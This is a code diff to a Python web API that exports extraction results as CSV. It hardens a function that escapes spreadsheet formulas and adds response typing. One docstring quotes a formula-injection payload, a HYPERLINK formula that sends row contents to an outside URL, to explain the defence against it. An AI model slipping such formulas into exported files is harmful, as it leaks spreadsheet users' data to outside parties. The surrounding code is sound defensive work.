@@ -13,8 +13,13 @@ from sqlalchemy.orm import Session
 from ..batch.service import list_batches, report
 from ..db import get_session
 from ..schemas import BatchOut, BatchSummary
+from .contract import FOUND, GATED, media, merged
 
-router = APIRouter(prefix="/api/batches", tags=["batches"])
+router = APIRouter(prefix="/api/batches", tags=["batches"], responses=merged(GATED, FOUND))
+
+
+class CsvResponse(PlainTextResponse):
+    media_type = "text/csv"
 
 
 @router.get("", response_model=list[BatchSummary])
@@ -38,13 +43,13 @@ def spreadsheet_cell(text: str) -> str:
     a contract's heading and a corpus file name are all text no one here chose, and a conclusion of
     '=HYPERLINK("https://...?leak="&A2&B2,"Open the clause")' opened in Excel as a live link that sent the row away
     (stress test, 2026-10-30, hostile-model 3). The text is never changed otherwise."""
-    if text[:1] in ("\t", "\r") or text.lstrip("  \t\r\n")[:1] in _FORMULA_LEADS:
+    if text[:1] in ("\t", "\r") or text.lstrip(" \u00a0\t\r\n")[:1] in _FORMULA_LEADS:
         return "'" + text
     return text
 
 
-@router.get("/{batch_id}/values.csv", response_class=PlainTextResponse)
-def batch_values_csv(batch_id: str, session: Session = Depends(get_session)) -> PlainTextResponse:
+@router.get("/{batch_id}/values.csv", response_class=CsvResponse, responses=media("text/csv", "One row per document and field.", {"type": "string"}))
+def batch_values_csv(batch_id: str, session: Session = Depends(get_session)) -> CsvResponse:
     """One row per document and field: the value, its status, the citation and how it was located, and the run. For
     spreadsheets: a cell that would be evaluated is escaped (spreadsheet_cell); GET /api/batches/{id} has the exact values."""
     out = report(session, batch_id)
@@ -56,4 +61,4 @@ def batch_values_csv(batch_id: str, session: Session = Depends(get_session)) -> 
             value = row.values[field.key]
             cells = [row.document_name, field.key, value.outcome, value.value or "", value.status or "", value.citation or "", value.method or "", value.run_id]
             writer.writerow([spreadsheet_cell(cell) for cell in cells])
-    return PlainTextResponse(buffer.getvalue(), media_type="text/csv", headers={"Content-Disposition": f'attachment; filename="batch-{batch_id}-values.csv"'})
+    return CsvResponse(buffer.getvalue(), headers={"Content-Disposition": f'attachment; filename="batch-{batch_id}-values.csv"'})
